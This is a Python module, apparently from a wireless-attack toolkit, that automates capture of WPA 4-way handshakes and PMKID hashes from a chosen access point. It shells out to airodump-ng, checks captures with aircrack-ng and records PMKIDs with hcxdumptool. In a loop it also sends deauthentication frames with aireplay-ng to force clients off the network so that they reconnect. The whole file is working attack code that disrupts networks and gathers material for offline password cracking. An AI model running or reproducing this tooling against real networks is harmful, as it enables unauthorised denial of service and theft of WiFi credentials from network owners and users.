import re
import time
from pathlib import Path
from typing import Optional

from .scanner import set_channel
from .utils import ToolError, is_bssid, parse_handshake_count, run, run_quiet


_HANDSHAKE_KEYS = re.compile(r"WPA handshake:\s*([0-9A-Fa-f:]{17})")


def _deauth(iface: str, bssid: str, client: Optional[str], count: int = 8) -> None:
    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
    if client:
        cmd += ["-c", client]
    cmd.append(iface)
    run_quiet(cmd)


def _handshake_ok(cap: Path, bssid: str) -> bool:
    if not cap.exists() or cap.stat().st_size == 0:
        return False
    out = run(["aircrack-ng", "-b", bssid, str(cap)]).stdout or ""
    return parse_handshake_count(out) > 0


def capture_handshake(
    iface: str,
    bssid: str,
    channel: int,
    outdir: Path,
    wait_seconds: int = 120,
    client: Optional[str] = None,
) -> Path:
    if not is_bssid(bssid):
        raise ToolError(f"invalid bssid: {bssid}")

    outdir.mkdir(parents=True, exist_ok=True)
    prefix = outdir / f"hs_{bssid.replace(':', '').lower()}"
    set_channel(iface, channel)

    proc = run_quiet_start([
        "airodump-ng",
        "--bssid", bssid,
        "--channel", str(channel),
        "--write-interval", "1",
        "--output-format", "pcap",
        "-w", str(prefix),
        iface,
    ])

    deadline = time.time() + wait_seconds
    cap_file: Optional[Path] = None

    try:
        while time.time() < deadline:
            time.sleep(3)
            for cand in sorted(outdir.glob(f"{prefix.name}-*.cap")) + sorted(outdir.glob(f"{prefix.name}-*.pcap")):
                if _handshake_ok(cand, bssid):
                    cap_file = cand
                    break
            if cap_file:
                break
            _deauth(iface, bssid, client, count=8)
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except Exception:
            proc.kill()

    if cap_file is None:
        candidates = sorted(outdir.glob(f"{prefix.name}-*.cap")) + sorted(outdir.glob(f"{prefix.name}-*.pcap"))
        if candidates and _handshake_ok(candidates[-1], bssid):
            cap_file = candidates[-1]

    if cap_file is None:
        raise ToolError("no valid 4-way handshake captured within wait window")
    return cap_file


def capture_pmkid(iface: str, outdir: Path, timeout_seconds: int = 120) -> Path:
    outdir.mkdir(parents=True, exist_ok=True)
    prefix = outdir / f"pmkid_{int(time.time())}"
    pcapng = prefix.with_suffix(".pcapng")

    proc = run_quiet_start([
        "hcxdumptool",
        "-i", iface,
        "-o", str(pcapng),
        "--enable_status=1",
    ])

    try:
        proc.wait(timeout=timeout_seconds)
    except Exception:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except Exception:
            proc.kill()

    if not pcapng.exists() or pcapng.stat().st_size == 0:
        raise ToolError("hcxdumptool produced no pcapng")
    return pcapng


def run_quiet_start(cmd):
    import subprocess
    try:
        return subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
        )
    except FileNotFoundError as e:
        raise ToolError(str(e)) from e
